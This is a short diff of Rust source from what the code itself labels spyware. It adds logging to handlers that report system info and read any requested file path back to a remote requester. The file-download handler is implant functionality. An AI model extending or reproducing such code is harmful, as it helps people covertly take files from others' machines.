@@ -3,6 +3,7 @@ use crate::communication::messages::{
     OperatingSystem, PointerWidth,
 };
 use std::fs::read_to_string;
+use log::{debug, error};
 
 // This method of getting the target OS is cool because:
 //  -The binary won't include all of this logic
@@ -75,6 +76,7 @@ fn get_pointer_width() -> PointerWidth {
 }
 
 pub fn get_basic_info_request() -> GetBasicInfoResponse {
+    debug!("Handling get basic info request");
     // TODO implement versions for real
     const SPYWARE_VERSION: u32 = 1;
     GetBasicInfoResponse {
@@ -88,17 +90,23 @@ pub fn get_basic_info_request() -> GetBasicInfoResponse {
 }
 
 pub fn download_file_message(request: DownloadFileRequest) -> DownloadFileResponse {
+    debug!("Handling download file request: path \"{}\"", request.path);
     match read_to_string(request.path) {
-        Ok(data) => DownloadFileResponse {
-            file_data: data.as_bytes().to_vec(),
-            error_info: None,
+        Ok(data) => {
+            DownloadFileResponse {
+                file_data: data.as_bytes().to_vec(),
+                error_info: None,
+            }
         },
-        Err(err) => DownloadFileResponse {
-            file_data: vec![],
-            error_info: Some(ErrorInfo {
-                raw_os_error: err.raw_os_error().unwrap_or(-1),
-                as_string: err.to_string(),
-            }),
+        Err(err) => {
+            error!("Could not read file, error \"{}\"", err.to_string());
+            DownloadFileResponse {
+                file_data: vec![],
+                error_info: Some(ErrorInfo {
+                    raw_os_error: err.raw_os_error().unwrap_or(-1),
+                    as_string: err.to_string(),
+                }),
+            }
         },
     }
 }
